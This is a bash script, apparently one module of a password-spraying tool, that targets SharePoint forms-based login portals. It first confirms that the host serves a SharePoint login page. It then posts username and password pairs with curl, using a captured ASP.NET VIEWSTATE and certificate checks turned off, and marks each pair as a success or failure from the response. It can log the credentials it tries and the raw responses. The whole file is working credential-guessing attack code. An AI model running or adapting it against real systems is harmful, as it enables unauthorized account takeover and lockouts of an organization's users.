#!/bin/bash

check_SharePoint(){

	check_Portal=$(wget --timeout=4 -qO- https://$1/_forms/default.aspx --no-check-certificate);
	if ([ "$(echo $check_Portal | grep "SharePoint" )" ]) || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
		:
	else	
		echo "Either not a SharePoint portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi
}

POST_SharePoint(){
LOG_YES=false;
LOG=/tmp/conformer.log;
#Determine if Logging, and where to log
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
LOG_YES=true;
LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
	if [[ "$LOG" == "" ]] ; then
		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
		if [[ "$LOG" == "" ]] ; then
			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
			if [[ "$LOG" == "" ]] ; then
				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$LOG" ]] ; then
	LOG_YES=false;
fi
fi


DEBUG_YES=false;
DEBUG=/tmp/conformer.debug;
#Determine if Debuging, and where to debug to.
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
DEBUG_YES=true;
DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
	if [[ "$DEBUG" == "" ]] ; then
		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
		if [[ "$DEBUG" == "" ]] ; then
			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
			if [[ "$DEBUG" == "" ]] ; then
				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$DEBUG" ]] ; then
	DEBUG_YES=false;
fi
fi

			#Curl sends POST parameters to SharePoint Portal
			POST=$(curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/_forms/default.aspx?TAM_OP=error&USERNAME=unauthenticated&ERROR_CODE=0x38cf025e&ERROR_TEXT=DPWWA0606E%20%20%20Could%20not%20sign%20user%20%27%25s%27%20on%20due%20to%20incorrect%20target&METHOD=GET&URL=%2F_windows%2Fdefault.aspx%3FReturnUrl%3D%252f_layouts%252f15%252fAuthenticate.aspx%253fSource%253d%25252F%26Source%3D%252F&HOSTNAME='$1'&AUTHNLEVEL=' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'WSS_FullScreenMode=false' \
    --data-binary $'__LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTI3MTUwMzc3Ng9kFgJmD2QWAgIBD2QWBAIBD2QWAgIFD2QWAmYPZBYCAgEPFgIeBFRleHQFB1NpZ24gSW5kAgMPZBYIAgUPFgIeB1Zpc2libGVoZAIHDxYCHwFoZAIJD2QWAgIBD2QWBAIBDxYCHwAFvAFXYXJuaW5nOiB0aGlzIHBhZ2UgaXMgbm90IGVuY3J5cHRlZCBmb3Igc2VjdXJlIGNvbW11bmljYXRpb24uIFVzZXIgbmFtZXMsIHBhc3N3b3JkcywgYW5kIGFueSBvdGhlciBpbmZvcm1hdGlvbiB3aWxsIGJlIHNlbnQgaW4gY2xlYXIgdGV4dC4gRm9yIG1vcmUgaW5mb3JtYXRpb24sIGNvbnRhY3QgeW91ciBhZG1pbmlzdHJhdG9yLmQCAw88KwAKAQAPFgIeCFVzZXJOYW1lBQd0ZXN0MTIzZBYCZg9kFgYCAQ8PFgIfAAVoVGhlIHNlcnZlciBjb3VsZCBub3Qgc2lnbiB5b3UgaW4uIE1ha2Ugc3VyZSB5b3VyIHVzZXIgbmFtZSBhbmQgcGFzc3dvcmQgYXJlIGNvcnJlY3QsIGFuZCB0aGVuIHRyeSBhZ2Fpbi5kZAIFDw8WAh8ABQd0ZXN0MTIzZGQCDQ8QDxYCHgdDaGVja2VkaGRkZGQCCw8WAh8BaGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFLmN0bDAwJFBsYWNlSG9sZGVyTWFpbiRzaWduSW5Db250cm9sJFJlbWVtYmVyTWUp0tj3kVtrGBhF9KYTkhuJXDRx3X5vLWScukZhaxuopg%3D%3D&__VIEWSTATEGENERATOR=2EB18009&__EVENTVALIDATION=%2FwEdAAXXpINfYgngnU2tMDdZPemGD3gNq6qp%2FJTilQw5ZNkpfe4vJyKPNbAHwGois4u5nam1l6dqP2Wbh%2FcJ6mTdRfbZlEhHQiVh76p32p9wa76sT8sOFRHvdLIfciF0DI2h8bJlcLML77Svz0uDzJzBRQRb&ctl00%24PlaceHolderMain%24signInControl%24UserName='$line'&ctl00%24PlaceHolderMain%24signInControl%24password='$pass'&ctl00%24PlaceHolderMain%24signInControl%24login=Sign+In' \
    $'https://'$1'/_forms/default.aspx?TAM_OP=error&USERNAME=unauthenticated&ERROR_CODE=0x38cf025e&ERROR_TEXT=DPWWA0606E%20%20%20Could%20not%20sign%20user%20%27%25s%27%20on%20due%20to%20incorrect%20target&METHOD=GET&URL=%2F_windows%2Fdefault.aspx%3FReturnUrl%3D%252f_layouts%252f15%252fAuthenticate.aspx%253fSource%253d%25252F%26Source%3D%252F&HOSTNAME='$1'&AUTHNLEVEL=');
		
#POST=$(curl -i -s -k  -X $'POST' \
#   -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/_forms/default.aspx?ReturnUrl=%2f_layouts%2fAuthenticate.aspx%3fSource%3d%252F&Source=%2F' -H $'Content-Type: application/x-www-form-urlencoded' \
#    --data-binary $'__LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTU5MjAzODM5MQ9kFgJmD2QWAgIBD2QWBAIBD2QWAgIFD2QWAmYPZBYCAgEPFgIeBFRleHQFB1NpZ24gSW5kAgMPZBYKAgMPFgIeB1Zpc2libGVoZAIFDxYCHwFoZAIJD2QWAgIBDxYCHwAFB1NpZ24gSW5kAgsPZBYEAgEPFgIfAAW8AVdhcm5pbmc6IHRoaXMgcGFnZSBpcyBub3QgZW5jcnlwdGVkIGZvciBzZWN1cmUgY29tbXVuaWNhdGlvbi4gVXNlciBuYW1lcywgcGFzc3dvcmRzLCBhbmQgYW55IG90aGVyIGluZm9ybWF0aW9uIHdpbGwgYmUgc2VudCBpbiBjbGVhciB0ZXh0LiBGb3IgbW9yZSBpbmZvcm1hdGlvbiwgY29udGFjdCB5b3VyIGFkbWluaXN0cmF0b3IuZAIDDzwrAAoBAA8WAh4IVXNlck5hbWUFBHRlc3RkFgJmD2QWBgIBDw8WAh8ABWhUaGUgc2VydmVyIGNvdWxkIG5vdCBzaWduIHlvdSBpbi4gTWFrZSBzdXJlIHlvdXIgdXNlciBuYW1lIGFuZCBwYXNzd29yZCBhcmUgY29ycmVjdCwgYW5kIHRoZW4gdHJ5IGFnYWluLmRkAgUPDxYCHwAFBHRlc3RkZAINDxAPFgIeB0NoZWNrZWRoZGRkZAINDxYCHwFoFgICAQ8PFgIeCEltYWdlVXJsBSEvX2xheW91dHMvMTAzMy9pbWFnZXMvY2FscHJldi5wbmdkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUuY3RsMDAkUGxhY2VIb2xkZXJNYWluJHNpZ25JbkNvbnRyb2wkUmVtZW1iZXJNZcDa%2BycFTredBtM8YcQ6KuRxsPfx&__EVENTVALIDATION=%2FwEWBQL46eetCwKepvWvAQLp4fSGCQKHhvXBDQLsrazDCBxz6ApwwfXL%2BMIIaPOsnmtRI5z%2F&ctl00%24PlaceHolderMain%24signInControl%24UserName='$line'&ctl00%24PlaceHolderMain%24signInControl%24password='$pass'&ctl00%24PlaceHolderMain%24signInControl%24login=Sign+In' \
#    $'https://'$1'/_forms/default.aspx?ReturnUrl=%2f_layouts%2fAuthenticate.aspx%3fSource%3d%252F&Source=%2F')

#If Logging is enabled loop userlist
		if [[ $DEBUG_YES == true ]]; then
			echo "host:$1 username:$line password:$pass" >> "$DEBUG";
			echo "" >> "$DEBUG";			
			echo "$POST" >> "$DEBUG";
			echo "" >> "$DEBUG";	
			echo "" >> "$DEBUG";	
			echo "-------------------------------------------------------------" >> "$DEBUG";	
		fi
			#checks if cookies returned or left empty or if default return html presented.
			if [[ $POST == *"<title>Object moved</title>"* ]] ; then
				echo "	$line:$pass:**Success**";
			# Logging
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:**Success**" >> "$LOG";
			fi
			elif [[ $POST == *"The server could not sign you in"* ]]; then
				echo "	$line:$pass:Fail";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail" >> "$LOG";
			fi
			else
				echo "	$line:$pass:Fail --- Page not responding properly.";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly." >> "$LOG";
			fi
			fi
}
